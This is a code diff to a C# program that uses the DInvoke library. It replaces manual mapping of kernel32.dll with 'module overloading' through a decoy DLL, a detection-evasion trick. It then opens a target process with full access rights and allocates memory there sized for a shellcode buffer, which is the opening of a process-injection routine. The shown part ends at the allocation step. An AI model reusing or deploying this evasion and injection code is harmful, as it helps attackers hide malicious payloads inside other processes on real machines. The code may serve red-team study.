@@ -70,15 +70,19 @@ namespace dinvokemm
             var pid = (uint)process.Id;
 
             // 0. Manual Mapping of kernel32.dll + debugging messages
-            DInvoke.Data.PE.PE_MANUAL_MAP kernelModule = DInvoke.ManualMap.Map.MapModuleToMemory("C:\\Windows\\System32\\kernel32.dll");
-            Console.WriteLine("[>] Module Base Addr - 0x{0}", kernelModule.ModuleBase.ToString("x2"));
+            //DInvoke.Data.PE.PE_MANUAL_MAP kernelModule = DInvoke.ManualMap.Map.MapModuleToMemory("C:\\Windows\\System32\\kernel32.dll");
+            //Console.WriteLine("[>] Module Base Addr - 0x{0}", kernelModule.ModuleBase.ToString("x2"));
 
-            // 1. OpenProcess - Get a handle to the notepad process that was spawned 
+            // 0. Use me for module overloading! 
+            DInvoke.Data.PE.PE_MANUAL_MAP kernelModule = DInvoke.ManualMap.Overload.OverloadModule("C:\\Windows\\System32\\kernel32.dll");
+            Console.WriteLine("[>] Using decoy module: " + kernelModule.DecoyModule);
+            Console.WriteLine("[>] Decoy module Addr: 0x" + kernelModule.ModuleBase.ToString("x2"));
+            Console.ReadLine();
+
             object[] openProcessParameters = { DInvoke.Data.Win32.Kernel32.ProcessAccessFlags.PROCESS_ALL_ACCESS, false, pid };
             var hProc = (IntPtr)DInvoke.DynamicInvoke.Generic.CallMappedDLLModuleExport(kernelModule.PEINFO, kernelModule.ModuleBase, "OpenProcess", typeof(DInvoke.DynamicInvoke.Win32.Delegates.OpenProcess), openProcessParameters, false);
             Console.WriteLine("[>] Process handle: " + string.Format("0x{0:X}", hProc.ToInt64()) + "\n");
 
-            // 2. VirtualAllocEx - Allocate memory to notepad 
             Console.WriteLine("[+] VirtualAllocEx - Allocating memory to process");
             object[] vAllocParameters = { hProc, IntPtr.Zero, (uint)sc.Length, 0x1000 | 0x2000, 0x04 };
             var allocResult = (IntPtr)DInvoke.DynamicInvoke.Generic.CallMappedDLLModuleExport(kernelModule.PEINFO, kernelModule.ModuleBase, "VirtualAllocEx", typeof(DELEGATES.VirtualAllocEx), vAllocParameters);
